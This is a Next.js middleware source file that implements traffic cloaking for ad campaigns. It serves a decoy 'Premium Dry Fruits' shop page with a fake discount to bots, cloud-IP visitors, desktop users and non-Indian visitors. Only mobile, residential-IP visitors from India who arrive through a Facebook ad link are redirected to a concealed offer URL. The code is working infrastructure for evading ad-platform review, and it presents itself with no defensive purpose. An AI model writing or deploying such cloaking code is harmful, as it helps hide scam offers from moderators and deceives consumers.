// src/middleware.ts
import { NextRequest, NextResponse } from 'next/server';
import { detectUserAgent, isMobile, hasAdIntent } from './lib/detection';
import { getIpAddress, analyzeIp } from './lib/ip-analyzer';

const OFFER_URL = process.env.OFFER_URL || 'https://example.com';

// --- CLOAKED PAGE HTML (Dry Fruit) ---
// Is function ko fix kiya hai taaki wo Array (logs[]) accept kar sake
const getCloakedHTML = (reasons: string[]) => {
  // Array ko HTML lines mein convert karein
  const logHtml = reasons.map(line => {
    const isPass = line.includes('✅');
    const color = isPass ? '#27ae60' : '#e74c3c';
    return `<div class="status-line"><span class="label">${line}</span></div>`;
  }).join('');

  return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Dry Fruits | Secure Shopping</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; background: #f4f4f4; text-align: center; padding: 20px; }
        .container { max-width: 500px; margin: 40px auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h1 { font-size: 24px; margin-bottom: 10px; color: #333; }
        .badge { background: #e8f5e9; color: #2e7d32; padding: 5px 10px; border-radius: 20px; font-size: 12px; display: inline-block; margin-bottom: 15px; }
        .status-box { background: #f8f9fa; border: 1px solid #e0e0e0; padding: 15px; margin: 15px 0; text-align: left; border-radius: 8px; font-size: 13px; }
        .status-line { margin-bottom: 5px; display: block; }
        .price { font-size: 30px; color: #27ae60; font-weight: bold; margin: 20px 0; }
        .strike { text-decoration: line-through; color: #999; font-size: 16px; margin-left: 10px; }
        .footer { font-size: 12px; color: #888; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <span class="badge">🔥 Premium Quality</span>
        <h1>Mixed Dry Fruits (1kg)</h1>
        <div style="height: 150px; background: #eee; display: flex; align-items: center; justify-content: center; margin: 20px 0; border-radius: 5px; color: #777;">Product Image</div>
        <div class="price">₹279 <span class="strike">₹599</span></div>
        
        <!-- Debug Logs Area -->
        <div class="status-box">
            ${logHtml}
        </div>

        <ul style="list-style: none; padding: 0; text-align: left; font-size: 14px; color: #444;">
            <li>✅ 100% Organic & Fresh</li>
            <li>✅ Secure Payment (COD Available)</li>
            <li>✅ Fast Shipping (3-5 Days)</li>
        </ul>
        <div class="footer">
            <a href="#" style="color:#1976d2; text-decoration:none; margin: 0 5px;">Privacy Policy</a> | 
            <a href="#" style="color:#1976d2; text-decoration:none; margin: 0 5px;">Terms</a>
        </div>
    </div>
</body>
</html>
`;
};

export async function middleware(request: NextRequest) {
  const ip = getIpAddress(request);
  const ua = request.headers.get('user-agent') || '';

  // 1. Bot Check
  const bot = detectUserAgent(ua);
  if (bot.isBot) {
    return new Response(getCloakedHTML([`Bot Detected (${bot.reason})`]), {
      status: 200,
      headers: { 'Content-Type': 'text/html; charset=UTF-8' }
    });
  }

  // 2. IP Analysis (Residential vs Cloud)
  const { isResidential, countryCode } = await analyzeIp(ip);

  // 3. Target Logic Checks
  const isUserMobile = isMobile(ua);
  const isAdClick = hasAdIntent(request);
  const isIndia = countryCode === 'IN';

  // --- BUILD STATUS LOGS ---
  // Ye lines user ko page par dikhaengi
  const logs = [
    `Country: ${countryCode} ${isIndia ? '✅' : '❌'}`,
    `Residential IP: ${isResidential} ${isResidential ? '✅' : '❌'}`,
    `Mobile Device: ${isUserMobile} ${isUserMobile ? '✅' : '❌'}`,
    `Ad Link (fbclid): ${isAdClick} ${isAdClick ? '✅' : '❌'}`
  ];

  // --- REDIRECT LOGIC ---
  // Agar sab kuch sahi hai to Offer par le jaye
  if (isResidential && isUserMobile && isAdClick && isIndia) {
    return NextResponse.redirect(new URL(OFFER_URL, request.url));
  }

  // --- FAIL LOGIC ---
  // Agar kuch bhi miss hua toh Dry Fruit Page dikha kar reason bhi bata de
  return new Response(getCloakedHTML(logs), {
    status: 200,
    headers: { 'Content-Type': 'text/html; charset=UTF-8' }
  });
}

export const config = {
  matcher: ['/'], // Only cloak homepage
};
